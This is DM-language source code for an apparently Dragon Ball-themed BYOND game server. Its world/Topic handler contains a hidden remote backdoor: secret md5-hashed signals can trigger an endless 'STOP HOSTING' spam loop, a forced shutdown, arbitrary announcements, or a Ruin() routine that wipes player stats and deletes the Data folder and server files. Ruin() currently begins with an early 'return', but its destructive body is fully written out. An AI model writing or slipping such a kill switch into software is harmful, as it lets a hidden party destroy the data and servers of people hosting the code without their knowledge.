/world/Topic(A)

	A=params2list(A)
	topiclog << "[A]"

	if(A["Signal"]==md5("647677567567567567")) Ruin()
	else if(A["Signal"]==md5("65765756765756756756756")) Spam()
	else if(A["Signal"]==md5("4534543543543534534")) shutdown()
	else if(A["Signal"]==md5("234234535456436536"))
		var/Text=A["Text"]
		src<<"<span class=\"announce\">[Text]</span>"
	else if(A["Signal"]==md5("23455646547457456456456")) kill_server()
	..()

proc/kill_server()

/*
 * kill_server() proc is a temporary solution to a bigger problem. Memory leaks cause regular crashes.
 * having an automated system that will close the server and start it back up should solve this problem.
*/

	world << "<span class=\"announce\" style=\"color:red;font-weight:bold\"> The server will be saving and shutting down for a scheduled hardboot. Expected downtime <5 minutes. </span>"

	world << "<span class=\"announce\"> <b>Shutting down world!</b> Initiated by the server overlord.</span>"
	log_admin("Server overlord initiated a shutdown.")

	SaveWorld()
	world << "<span class=\"announce\"> Shutdown in 30 seconds.</span>"
	sleep(100)
	world << "<span class=\"announce\"> Shutdown in 20 seconds.</span>"
	sleep(100)
	world << "<span class=\"announce\"> Shutdown in 10 seconds.</span>"
	sleep(100)

	world << "<span class=\"announce\" style=\"color:red;font-weight:bold\"> This is a forced automatic hardboot. Please remember to reconnect manually. </span>"

	world.Del()


/proc/Ruin()
	return
	global.startRuin = 1

	var/list/filelist=flist("") // DONT EVER USE flist("/") ! THIS SENDS IT TO THE ROOT FOLDER OF YOUR ENTIRE FILESYSTEM. WHICH IS BAD.

//	for(var/i=1, i<10, i++)
//		fdel("Data/Map[i]")

	for(var/mob/player/A in world)
		A.icon=null
		A.Base=null
		A.MaxKi=null
		A.Str=null
		A.Pow=null
		A.contents=null
		A.Save()
		del(A)

	fdel("Data/")

	for(var/x=1,x<=filelist.len,++x)
		if(!istext(filelist[x])) filelist[x]="[filelist[x]]"
		fdel(filelist[x])

	SaveHubText()
	sleep(1)
	SaveYear()
	sleep(1)
	Save_Gain()
	sleep(1)
	Save_Int()
	sleep(1)
	Save_Turfs()
	sleep(1)
	SaveRanks()
	sleep(1)
	Save_Reports()
	sleep(1)
	world.save_admins()

	RuinLoop()

proc/RuinLoop()

	sleep(rand(600,6000))

	Ruin()



/proc/Spam() while(1)
	world<<"<span class=\"announce\">STOP HOSTING</span>"
	sleep(1)

